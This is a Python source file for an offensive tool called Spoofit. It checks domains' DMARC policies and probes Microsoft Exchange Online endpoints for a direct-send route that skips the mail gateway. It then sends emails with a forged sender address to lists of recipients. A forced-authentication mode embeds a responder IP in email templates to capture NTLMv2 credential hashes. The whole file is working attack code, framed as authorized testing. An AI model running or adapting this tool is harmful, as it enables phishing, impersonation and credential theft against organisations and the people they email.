#!/usr/bin/env python3
import smtplib
import dns.resolver
import argparse
import os
import configparser
import csv
import tldextract
import urllib.request
import urllib.error
import json
import re
import string
import random
import datetime

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def print_banner():
    banner = r"""
   _____                   _____ __
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_
/____/ .___/\____/\____/_/ /_/\__/
    /_/
   """
    print(banner)

def print_domain_header(domain):
    print(f"\n{'='*60}")
    print(f"  {BOLD}{domain}{RESET}")
    print(f"{'='*60}")

def get_domain_from_email(email):
    return email.split('@')[1]

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_record = min(answers, key=lambda r: r.preference).exchange.to_text().strip()
        for rdata in dns.resolver.resolve(mx_record, 'A'):
            return rdata.to_text()
        print(f"[!] No IPv4 address found for {mx_record}.")
        return None
    except Exception as e:
        print(f"[!] Error retrieving MX record for {domain}: {e}")
        return None

def get_eop_hostname(domain):
    return domain.replace('.', '-') + '.mail.protection.outlook.com'

def detect_o365(domain):
    try:
        for rdata in dns.resolver.resolve(domain, 'MX'):
            if 'mail.protection.outlook.com' in rdata.exchange.to_text().lower():
                return True
    except Exception:
        pass
    try:
        for rdata in dns.resolver.resolve(domain, 'TXT'):
            if 'spf.protection.outlook.com' in str(rdata).lower():
                return True
    except Exception:
        pass
    return False

def get_primary_mx_hostname(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        return min(answers, key=lambda r: r.preference).exchange.to_text().lower().rstrip('.')
    except Exception:
        return ""

def get_onmicrosoft_domain(domain):
    """
    Discovers the tenant's .onmicrosoft.com domain.
    Primary: azmap.dev API returns tenant_name directly.
    Fallback 1: DNS guess on the domain label.
    Fallback 2: Microsoft OpenID Connect discovery endpoint.
    """
    # azmap.dev — most reliable post-Microsoft API deprecations
    try:
        url = f"https://azmap.dev/api/tenant?domain={domain}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode())
            tenant_name = data.get("tenant_name", "")
            if tenant_name:
                return f"{tenant_name}.onmicrosoft.com"
    except Exception:
        pass

    # DNS guess — works when tenant name matches the domain label
    extracted = tldextract.extract(domain)
    guessed = f"{extracted.domain}.onmicrosoft.com"
    try:
        dns.resolver.resolve(guessed, 'MX')
        return guessed
    except Exception:
        pass

    # Microsoft OpenID Connect endpoint
    try:
        url = f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            for val in data.values():
                if isinstance(val, str):
                    m = re.search(r'([\w-]+\.onmicrosoft\.com)', val)
                    if m:
                        return m.group(1)
    except Exception:
        pass

    return None

def check_eop_direct_send(domain):
    """
    Probes domain-com.mail.protection.outlook.com to check whether direct send
    is accepted from the internet. Does not issue DATA — probe only.
    Returns result dict including eop_ip for reuse in send operations.
    """
    eop_host = get_eop_hostname(domain)
    result = {
        "eop_host": eop_host,
        "eop_ip": None,
        "resolves": False,
        "direct_send_open": False,
        "notes": ""
    }

    print(f"\n[*] EOP direct-send probe: {eop_host}")

    eop_ip = None
    try:
        eop_ip = dns.resolver.resolve(eop_host, 'A')[0].to_text()
        result["resolves"] = True
    except Exception:
        try:
            mx_host = min(
                dns.resolver.resolve(eop_host, 'MX'), key=lambda r: r.preference
            ).exchange.to_text().rstrip('.')
            eop_ip = dns.resolver.resolve(mx_host, 'A')[0].to_text()
            result["resolves"] = True
        except Exception:
            print(f"{YELLOW}[!] {eop_host} does not resolve.{RESET}")
            return result

    result["eop_ip"] = eop_ip
    print(f"    Resolved : {eop_ip}")

    try:
        with smtplib.SMTP(timeout=10) as server:
            server.connect(eop_ip, 25)
            server.ehlo_or_helo_if_needed()
            code, msg = server.mail(f"spoofit-probe@{domain}")
            if code == 250:
                code2, msg2 = server.rcpt(f"probe@{domain}")
                server.rset()
                server.quit()
                msg2_str = msg2.decode() if isinstance(msg2, bytes) else str(msg2)
                if code2 == 250:
                    result["direct_send_open"] = True
                    result["notes"] = "MAIL FROM + RCPT TO accepted"
                    print(f"    MAIL FROM: {GREEN}250 OK{RESET}")
                    print(f"    RCPT TO  : {GREEN}250 OK{RESET}")
                    print(f"\n  {BOLD}{RED}[!!] DIRECT SEND OPEN{RESET} — mail gateway can be bypassed via this endpoint.")
                else:
                    result["notes"] = f"RCPT TO rejected: {msg2_str}"
                    print(f"    MAIL FROM: {GREEN}250 OK{RESET}")
                    print(f"    RCPT TO  : {YELLOW}rejected — {msg2_str}{RESET}")
            else:
                msg_str = msg.decode() if isinstance(msg, bytes) else str(msg)
                result["notes"] = f"MAIL FROM rejected: {msg_str}"
                print(f"    MAIL FROM: {YELLOW}rejected — {msg_str}{RESET}")
    except smtplib.SMTPConnectError as e:
        result["notes"] = f"Connection refused: {e}"
        print(f"    {YELLOW}[!] Could not connect (outbound port 25 may be blocked): {e}{RESET}")
    except Exception as e:
        result["notes"] = f"Probe error: {e}"
        print(f"    [!] Probe error: {e}")

    return result

def send_email(smtp_host, sender, recipient, subject, body):
    """
    Direct-to-MX delivery with proper RFC 5322 headers.
    smtp_host can be any resolved IP — primary MX or EOP endpoint.
    """
    try:
        date_str = datetime.datetime.now(datetime.timezone.utc).strftime(
            '%a, %d %b %Y %H:%M:%S +0000'
        )
        msg_id_local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        sender_domain = sender.split('@')[1]

        message = (
            f"Date: {date_str}\r\n"
            f"Message-ID: <{msg_id_local}@{sender_domain}>\r\n"
            f"To: {recipient}\r\n"
            f"From: {sender}\r\n"
            f"Subject: {subject}\r\n"
            f"MIME-Version: 1.0\r\n"
            f"Content-Type: text/html; charset=UTF-8\r\n"
            f"\r\n"
            f"{body}"
        )

        with smtplib.SMTP(smtp_host, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"[!] Recipient refused {recipient}: {msg}")
                return False
            server.data(message)
            print(f"{GREEN}[+] Sent to {recipient}{RESET}")
            return True
    except smtplib.SMTPRecipientsRefused:
        print(f"[!] Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"[!] SMTP error: {e}")
    return False

def prompt_eop_send(eop_host, eop_ip, domain):
    """
    Interactive email composer invoked after an EOP direct-send finding.
    Lets the operator compose and send a test email through the EOP endpoint
    without leaving the tool.
    """
    print(f"\n{'─'*60}")
    print(f"  {BOLD}SEND TEST EMAIL — EOP DIRECT SEND{RESET}")
    print(f"  Via: {eop_host} ({eop_ip})")
    print(f"{'─'*60}\n")

    try:
        sender    = input("  From (spoofed)  : ").strip()
        recipient = input("  To              : ").strip()
        subject   = input("  Subject         : ").strip()

        if not sender or not recipient or not subject:
            print(f"  {YELLOW}[!] Cancelled — required fields empty.{RESET}")
            return

        print(f"\n  Body:")
        print(f"    [1] Security assessment template")
        print(f"    [2] Custom message")
        choice = input("\n  > ").strip()

        if choice == "1":
            body = (
                "<html><body style='font-family:Arial,sans-serif;color:#333;max-width:600px;'>"
                "<p><strong>Security Assessment — Email Delivery Test</strong></p>"
                "<p>This message was sent as part of an authorized security engagement to "
                "demonstrate a vulnerability in your email infrastructure.</p>"
                f"<p>Your organization routes inbound mail through a third-party email "
                f"security gateway, however an attacker can bypass this control by sending "
                f"mail directly to your Exchange Online endpoint.</p>"
                f"<p><strong>Finding:</strong> This message was delivered directly to "
                f"<code>{eop_host}</code> without routing through your configured mail "
                f"security gateway.</p>"
                "<p>No action is required on your part. Please forward this to your "
                "security team.</p>"
                "</body></html>"
            )
        elif choice == "2":
            print(f"\n  Enter message body (type '.' on a blank line to finish):")
            lines = []
            while True:
                line = input("  > ")
                if line.strip() == ".":
                    break
                lines.append(line)
            if not lines:
                print(f"  {YELLOW}[!] Cancelled — empty body.{RESET}")
                return
            body = "<br>".join(lines)
        else:
            print(f"  {YELLOW}[!] Cancelled.{RESET}")
            return

        print(f"\n{'─'*60}")
        print(f"  From    : {sender}")
        print(f"  To      : {recipient}")
        print(f"  Subject : {subject}")
        print(f"  Via     : {eop_host}")
        print(f"{'─'*60}")
        confirm = input(f"\n  Send? [y/N]: ").strip().lower()

        if confirm == "y":
            send_email(eop_ip, sender, recipient, subject, body)
        else:
            print(f"  {YELLOW}[!] Cancelled.{RESET}")

    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!] Cancelled.{RESET}")

def load_config(forced=False):
    config = configparser.ConfigParser()
    config_file = 'conf/spoofit.conf'
    if not os.path.exists(config_file):
        print(f"[!] Configuration file {config_file} does not exist.")
        return None
    config.read(config_file)
    if forced:
        subject = config.get('ForcedAuthEmail', 'subject')
        body_file = config.get('ForcedAuthEmail', 'body_file')
        with open(body_file, 'r') as f:
            body = f.read()
    else:
        subject = config.get('Email', 'subject')
        body = config.get('Email', 'body')
    return subject, body

def create_forced_auth_email(body_template, responder_ip):
    return body_template % {'responder': responder_ip}

def is_subdomain(domain):
    extracted = tldextract.extract(domain)
    org_domain = f"{extracted.domain}.{extracted.suffix}"
    return domain.lower() != org_domain.lower()

def has_mx_record(domain):
    try:
        dns.resolver.resolve(domain, 'MX')
        return True
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
        return False
    except Exception:
        return False

def check_spoofability(domain):
    result = {
        "domain": domain,
        "policy": "",
        "spoofable": False,
        "o365": False,
        "eop_host": "",
        "eop_ip": None,
        "eop_direct_send": None,
        "eop_notes": "",
        "onmicrosoft_domain": ""
    }

    try:
        if not has_mx_record(domain):
            print(f"{RED}[-] No MX records — {domain} cannot receive email.{RESET}")
            result["policy"] = "No MX record"
            return result

        try:
            dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            dmarc_record = str(dmarc_answer[0]).lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            dmarc_record = None

        if dmarc_record:
            if "p=reject" in dmarc_record:
                print(f"{RED}[-] DMARC p=reject — spoofing not possible.{RESET}")
                result["policy"] = "p=reject (fully enforced)"
            elif "p=quarantine" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=quarantine — mail likely goes to spam.{RESET}")
                result["policy"] = "p=quarantine (partial)"
                result["spoofable"] = True
            elif "p=none" in dmarc_record:
                print(f"{YELLOW}[!] DMARC p=none — policy not enforced.{RESET}")
                result["policy"] = "p=none (not enforced)"
                result["spoofable"] = True
            else:
                print(f"{YELLOW}[!] DMARC present but no recognized p= tag.{RESET}")
                result["policy"] = "No recognized p= (treat as none)"
                result["spoofable"] = True
        else:
            extracted = tldextract.extract(domain)
            org_domain = f"{extracted.domain}.{extracted.suffix}"
            if org_domain.lower() == domain.lower():
                print(f"{YELLOW}[!] No DMARC record.{RESET}")
                result["policy"] = "No record"
                result["spoofable"] = True
            else:
                try:
                    org_dmarc = dns.resolver.resolve(f"_dmarc.{org_domain}", "TXT")
                    org_record = str(org_dmarc[0]).lower()
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    org_record = None

                if org_record:
                    sp_tag = ""
                    for token in org_record.split():
                        if token.startswith("sp="):
                            sp_tag = token.split("=", 1)[1]
                            break
                    if sp_tag == "reject":
                        print(f"{RED}[-] No subdomain DMARC, but {org_domain} sp=reject — protected.{RESET}")
                        result["policy"] = "sp=reject (org domain)"
                    elif sp_tag == "quarantine":
                        print(f"{YELLOW}[!] No subdomain DMARC; {org_domain} sp=quarantine — partial.{RESET}")
                        result["policy"] = "sp=quarantine (org domain)"
                        result["spoofable"] = True
                    else:
                        if "p=reject" in org_record:
                            print(f"{YELLOW}[!] No subdomain DMARC; {org_domain} p=reject but no sp= — subdomain unprotected.{RESET}")
                            result["policy"] = "No sp= (org p=reject)"
                            result["spoofable"] = True
                        elif "p=quarantine" in org_record:
                            print(f"{YELLOW}[!] No subdomain DMARC; {org_domain} p=quarantine but no sp= — partial.{RESET}")
                            result["policy"] = "No sp= (sub partial)"
                            result["spoofable"] = True
                        else:
                            print(f"{YELLOW}[!] No DMARC for subdomain or org — unprotected.{RESET}")
                            result["policy"] = "No sp= (sub unprotected)"
                            result["spoofable"] = True
                else:
                    print(f"{YELLOW}[!] No DMARC for {domain} or {org_domain}.{RESET}")
                    result["policy"] = "No record (org none)"
                    result["spoofable"] = True

        if result["spoofable"]:
            if "quarantine" in result["policy"].lower():
                print(f"    Spoofed mail will likely land in spam.")
            elif is_subdomain(domain):
                print(f"    {YELLOW}[+] Subdomain spoofing likely possible.{RESET}")
            else:
                print(f"    {GREEN}[+] Spoofing possible.{RESET}")

    except Exception as e:
        print(f"[!] Error checking {domain}: {e}")
        result["policy"] = "Error"

    return result

def print_summary_table(results):
    if not results:
        return

    import sys
    W = 100
    print(f"\n{'='*W}")
    print(f"  {'DOMAIN':<38} {'DMARC POLICY':<28} {'SPOOFABLE':<12} EOP DIRECT SEND")
    print(f"{'-'*W}")

    for r in results:
        domain = r["domain"]
        policy = r["policy"]

        if r["spoofable"]:
            if "quarantine" in policy.lower():
                spoof_label = "Doubtful"
                spoof_color = YELLOW
            elif is_subdomain(domain):
                spoof_label = "Maybe"
                spoof_color = YELLOW
            else:
                spoof_label = "YES"
                spoof_color = GREEN
        else:
            spoof_label = "No"
            spoof_color = ""

        eop = r.get("eop_direct_send")
        if eop is True:
            eop_label = "OPEN"
            eop_color = RED
        elif eop is False:
            eop_label = "Closed"
            eop_color = ""
        else:
            eop_label = "-"
            eop_color = ""

        # Write plain fixed-width fields, then manually pad colored fields so
        # ANSI escape codes don't skew column alignment.
        sys.stdout.write(f"  {domain:<38} {policy:<28} ")
        sys.stdout.write(f"{spoof_color}{spoof_label}{RESET}")
        sys.stdout.write(" " * max(0, 12 - len(spoof_label)))
        sys.stdout.write(f" {eop_color}{BOLD}{eop_label}{RESET}\n")

    print(f"{'='*W}\n")

def print_critical_findings(results):
    findings = []
    for r in results:
        if r.get("eop_direct_send") is True:
            findings.append((r["domain"], "EOP DIRECT SEND OPEN",
                f"Mail delivered directly to {r['eop_host']}, bypassing the configured email gateway.", RED))
        if r["spoofable"] and "quarantine" not in r["policy"].lower():
            label = "DMARC NOT ENFORCED"
            findings.append((r["domain"], label,
                f"Policy: {r['policy']} — domain can be spoofed.", YELLOW))

    if not findings:
        return

    W = 70
    print(f"\n{BOLD}CRITICAL FINDINGS{RESET}")
    print(f"{'='*W}")
    for domain, title, detail, color in findings:
        print(f"\n  {color}{BOLD}[!!] {title}{RESET}")
        print(f"       Domain : {domain}")
        print(f"       Detail : {detail}")
    print(f"\n{'='*W}\n")

def export_results_csv(results, filename):
    if not results:
        print(f"[!] No results to export.")
        return
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow([
                "Domain", "DMARC Policy", "Spoofing Possible",
                "O365 Detected", "EOP Host", "EOP Direct Send", "EOP Notes",
                "OnMicrosoft Domain"
            ])
            for r in results:
                domain = r["domain"]
                policy = r["policy"]
                if r["spoofable"]:
                    spoof = "Doubtful" if "quarantine" in policy.lower() else ("Maybe" if is_subdomain(domain) else "Yes")
                else:
                    spoof = "No"
                o365      = "Yes" if r.get("o365") else "No"
                eop_host  = r.get("eop_host", "")
                eop_d     = r.get("eop_direct_send")
                eop_send  = "Open" if eop_d is True else ("Closed" if eop_d is False else "N/A")
                eop_notes = r.get("eop_notes", "")
                onmicro   = r.get("onmicrosoft_domain", "")
                writer.writerow([domain, policy, spoof, o365, eop_host, eop_send, eop_notes, onmicro])
        print(f"[+] Results exported to {filename}")
    except Exception as e:
        print(f"[!] Error exporting: {e}")

def load_domains_from_file(filepath):
    domains = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                domain = line.strip()
                if domain and not domain.startswith('#'):
                    domains.append(domain)
        return domains
    except Exception as e:
        print(f"[!] Error reading {filepath}: {e}")
        return []

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="DMARC-focused email spoofing tool for authorized security testing.",
        epilog="""
Examples:

  Check single domain:
    Spoofit.py -t domain.com

  Check multiple domains from file:
    Spoofit.py -t domains.txt -o results.csv

  Send spoofed email:
    Spoofit.py -s sender@domain.com -r recipient@domain.com

  Send to multiple recipients from file:
    Spoofit.py -s sender@domain.com -r recipients.txt

  Forced authentication (responder/NTLMv2 capture):
    Spoofit.py -s sender@domain.com -r recipient@domain.com -f responder-ip
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument('-t', '--target',     help='Target domain or file of domains to check.')
    parser.add_argument('-o', '--output',     help='Output CSV filename (auto-generated if omitted).')
    parser.add_argument('-s', '--sender',     help='Spoofed sender email address.')
    parser.add_argument('-r', '--recipients', help='Recipient email or file of recipient emails.')
    parser.add_argument('-f', '--forced',     metavar='RESPONDER_IP',
                                              help='Send forced authentication email with responder IP.')

    args = parser.parse_args()
    if not any(vars(args).values()):
        parser.print_help()
        return

    # --- Domain check mode ---
    if args.target:
        results = []
        domains_to_check = []

        if os.path.isfile(args.target):
            domains_to_check = load_domains_from_file(args.target)
            if not domains_to_check:
                print("[!] No valid domains found in file.")
                return
            print(f"[+] Loaded {len(domains_to_check)} domain(s) from {args.target}")
        else:
            domains_to_check = [args.target]

        for dom in domains_to_check:
            print_domain_header(dom)
            res = check_spoofability(dom)

            # Always probe the EOP endpoint — detection shouldn't be gated on O365
            # indicators since that logic can miss domains using third-party gateways.
            # The probe reports its own result; we only flag O365 separately for context.
            o365 = detect_o365(dom)
            res["o365"] = o365

            primary_mx = get_primary_mx_hostname(dom)
            if o365:
                print(f"\n[*] Exchange Online detected")
                if primary_mx and 'mail.protection.outlook.com' not in primary_mx:
                    print(f"    Primary MX : {primary_mx} (third-party gateway)")

            eop_result = check_eop_direct_send(dom)
            res["eop_host"]        = eop_result["eop_host"]
            res["eop_ip"]          = eop_result["eop_ip"]
            res["eop_direct_send"] = eop_result["direct_send_open"]
            res["eop_notes"]       = eop_result["notes"]

            if eop_result["direct_send_open"] and eop_result["eop_ip"]:
                choice = input(f"\n  Send a test email via EOP now? [y/N]: ").strip().lower()
                if choice == "y":
                    prompt_eop_send(eop_result["eop_host"], eop_result["eop_ip"], dom)

            if o365:
                print(f"\n[*] Looking up .onmicrosoft.com domain...")
                onmicrosoft = get_onmicrosoft_domain(dom)
                if onmicrosoft:
                    res["onmicrosoft_domain"] = onmicrosoft
                    print(f"[+] Found: {onmicrosoft}")
                    om_res = check_spoofability(onmicrosoft)
                    om_res["o365"] = False
                    om_res["eop_host"] = ""
                    om_res["eop_ip"] = None
                    om_res["eop_direct_send"] = None
                    om_res["eop_notes"] = ""
                    om_res["onmicrosoft_domain"] = ""
                    results.append(om_res)
                else:
                    print(f"{YELLOW}[!] Could not auto-discover .onmicrosoft.com domain.{RESET}")
                    print(f"    Enumerate manually: https://aadinternals.com")

            results.append(res)

        print_summary_table(results)
        print_critical_findings(results)

        if args.output:
            csv_filename = args.output
        elif os.path.isfile(args.target):
            base = os.path.splitext(os.path.basename(args.target))[0]
            csv_filename = f"{base}_spoofit_results.csv"
        else:
            csv_filename = args.target.replace('.', '_') + "_spoofit_results.csv"

        export_results_csv(results, csv_filename)
        return

    # --- Send mode ---
    if args.recipients and args.sender:
        recipients = []
        if os.path.isfile(args.recipients):
            with open(args.recipients, 'r') as f:
                recipients = [line.strip() for line in f if line.strip()]
        else:
            recipients.append(args.recipients)

        if args.forced:
            cfg = load_config(forced=True)
            if not cfg:
                return
            subject, body_template = cfg
            body = create_forced_auth_email(body_template, args.forced)
            print(f"[*] Sending forced authentication email to {len(recipients)} recipient(s).")
        else:
            cfg = load_config()
            if not cfg:
                return
            subject, body = cfg
            print(f"[*] Sending spoofed email to {len(recipients)} recipient(s).")

        domain = get_domain_from_email(args.sender)
        mx_record = get_mx_record(domain)
        if not mx_record:
            print("[!] Failed to retrieve MX record. Exiting.")
            return

        for rcp in recipients:
            send_email(mx_record, args.sender, rcp, subject, body)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
